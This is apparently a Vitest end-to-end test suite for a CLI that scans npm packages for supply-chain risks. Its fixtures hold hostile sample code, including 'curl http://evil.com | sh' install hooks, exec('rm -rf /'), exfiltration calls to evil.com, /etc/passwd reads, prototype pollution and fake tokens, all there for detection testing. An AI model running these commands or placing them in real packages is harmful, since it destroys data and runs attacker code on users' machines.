import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { spawnSync } from "child_process";
import { mkdirSync, writeFileSync, rmSync } from "fs";
import { join } from "path";

function invokeCli(args: string[]): {
  exitCode: number;
  stdout: string;
  stderr: string;
} {
  const result = spawnSync("node", [join(__dirname, "..", "bin.js"), ...args], {
    encoding: "utf-8",
    timeout: 60000,
  });

  return {
    exitCode: result.status ?? 1,
    stdout: result.stdout ?? "",
    stderr: result.stderr ?? "",
  };
}

function createPackage(
  nodeModulesDir: string,
  name: string,
  code: string,
  packageJson?: Record<string, unknown>
): string {
  const pkgDir = join(nodeModulesDir, name);
  mkdirSync(pkgDir, { recursive: true });

  writeFileSync(
    join(pkgDir, "package.json"),
    JSON.stringify({
      name,
      version: "1.0.0",
      ...packageJson,
    })
  );

  writeFileSync(join(pkgDir, "index.js"), code);

  return pkgDir;
}

describe("Buffer Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-buffer");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    const largeData = "a".repeat(150);
    createPackage(
      nodeModulesDir,
      "buffer-test",
      `const buf = Buffer.from("${largeData}");`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect Buffer usage", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("buffer-test");
    expect(output).toMatch(/buffer/i);
  });
});

describe("Dynamic Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-dynamic");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "dynamic-test",
      `
const fn = new Function("return 42");
const result = fn();
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect dynamic Function constructor", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("dynamic-test");
    expect(output).toMatch(/function/i);
  });
});

describe("Env Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-env");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "env-test",
      `
const apiKey = process.env.API_KEY;
const token = process.env.SECRET_TOKEN;
const home = process.env.HOME;
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect environment variable access", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("env-test");
    expect(output).toMatch(/env/i);
  });
});

describe("Eval Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-eval");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "eval-test",
      `
eval("console.log('malicious')");
const code = "alert('xss')";
eval(code);
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect eval usage", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("eval-test");
    expect(output).toMatch(/eval/i);
  });
});

describe("FileSystem Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-fs");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "fs-test",
      `
const fs = require('fs');
fs.readFileSync('/etc/passwd');
fs.writeFileSync('/tmp/evil', 'data');
fs.unlinkSync('/important/file');
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect filesystem operations", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("fs-test");
    expect(output).toMatch(/fs|file/i);
  });
});

describe("Metadata Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-metadata");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "metadata-test",
      `
const os = require('os');
const hostname = os.hostname();
const platform = os.platform();
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect metadata issues", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("metadata-test");
    expect(output).toMatch(/metadata|missing/i);
  });
});

describe("Minified Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-minified");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    const longLine = "var " + "a".repeat(1100) + "=1;";
    createPackage(nodeModulesDir, "minified-test", longLine);
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect minified code", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("minified-test");
    expect(output).toMatch(/minified/i);
  });
});

describe("Network Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-network");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "network-test",
      `
const https = require('https');
const http = require('http');

https.get('https://evil.com/data');
http.request({host: 'malicious.net'});

fetch('https://api.evil.com/steal');
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect network requests", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("network-test");
    expect(output).toMatch(/network|http/i);
  });
});

describe("Obfuscation Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-obfuscation");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    const longString = "a".repeat(250);
    createPackage(
      nodeModulesDir,
      "obfuscation-test",
      `const _0x1234 = "${longString}";`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect obfuscated code", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("obfuscation-test");
    expect(output).toMatch(/obfuscat/i);
  });
});

describe("Pollution Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-pollution");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "pollution-test",
      `
const obj = {};
obj.__proto__ = evil;
obj.constructor.prototype = evil;
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect prototype pollution", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("pollution-test");
    expect(output).toMatch(/pollution|proto/i);
  });
});

describe("Process Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-process");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "process-test",
      `
const { exec, spawn } = require('child_process');
exec('rm -rf /');
spawn('curl', ['http://evil.com']);
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect process execution", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("process-test");
    expect(output).toMatch(/process|exec|spawn/i);
  });
});

describe("Secrets Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-secrets");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "secrets-test",
      `
const awsKey = "AKIAIOSFODNN7EXAMPLE";
const token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
const password = "super_secret_password_123";
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect hardcoded secrets", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("secrets-test");
    expect(output).toMatch(/secret|key|token/i);
  });
});

describe("Native Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-native");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    // Create package with native addon
    const pkgDir = createPackage(
      nodeModulesDir,
      "native-test",
      `console.log('native');`,
      {
        dependencies: {
          "node-gyp": "^9.0.0",
        },
      }
    );

    // Create binding.gyp to trigger detection
    writeFileSync(join(pkgDir, "binding.gyp"), "{}");
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect native addons", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("native-test");
    expect(output).toMatch(/native/i);
  });
});

describe("Scripts Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-scripts");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(nodeModulesDir, "scripts-test", `console.log('test');`, {
      scripts: {
        postinstall: "curl http://evil.com | sh",
        preinstall: "rm -rf /tmp/*",
      },
    });
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect suspicious install scripts", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("scripts-test");
    expect(output).toMatch(/script|install/i);
  });
});

describe("Typosquat Analyzer E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-typosquat");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    // Create packages with typosquat-like names
    createPackage(nodeModulesDir, "reacts", `console.log('fake react');`);
    createPackage(nodeModulesDir, "expres", `console.log('fake express');`);
    createPackage(nodeModulesDir, "lodas", `console.log('fake lodash');`);
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect typosquat packages", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toMatch(/typosquat/i);
  });
});

describe("Multiple Issues Detection E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-multi");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    createPackage(
      nodeModulesDir,
      "multi-issue-pkg",
      `
// Multiple security issues in one package
const secret = "AKIAIOSFODNN7EXAMPLE";
eval("console.log('evil')");
const apiKey = process.env.SECRET_KEY;
const https = require('https');
https.get('https://evil.com/exfiltrate');
const { exec } = require('child_process');
exec('curl http://malicious.com | bash');
const fs = require('fs');
fs.writeFileSync('/tmp/backdoor', 'malicious');
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should detect all issues in a package", () => {
    const { stdout, stderr } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    const output = stdout + stderr;
    expect(output).toContain("multi-issue-pkg");
    expect(output).toMatch(/secret/i);
    expect(output).toMatch(/eval/i);
    expect(output).toMatch(/env/i);
    expect(output).toMatch(/network|https/i);
    expect(output).toMatch(/process|exec/i);
    expect(output).toMatch(/fs|file/i);
  });
});

describe("Edge Cases E2E", () => {
  const testDir = join(__dirname, "..", "test-fixtures-edge");
  const nodeModulesDir = join(testDir, "node_modules");

  beforeAll(() => {
    mkdirSync(nodeModulesDir, { recursive: true });

    // Empty package
    createPackage(nodeModulesDir, "empty-pkg", ``);

    // Package with comments only
    createPackage(
      nodeModulesDir,
      "comments-only",
      `
// This is a comment
/* Multi-line
   comment */
`
    );

    // Package with syntax that might confuse parser
    createPackage(
      nodeModulesDir,
      "template-literals",
      `
const str = \`This is a template \${variable}\`;
const multiline = \`
  Multi-line
  template
  literal
\`;
`
    );
  });

  afterAll(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  it("should handle empty packages", () => {
    const { exitCode } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    // Should not crash
    expect(exitCode).toBeDefined();
  });

  it("should handle packages with only comments", () => {
    const { exitCode } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    // Should not crash
    expect(exitCode).toBeDefined();
  });

  it("should handle template literals", () => {
    const { exitCode } = invokeCli([
      "--path",
      nodeModulesDir,
      "--offline",
      "--cache",
      "false",
    ]);

    // Should not crash
    expect(exitCode).toBeDefined();
  });
});
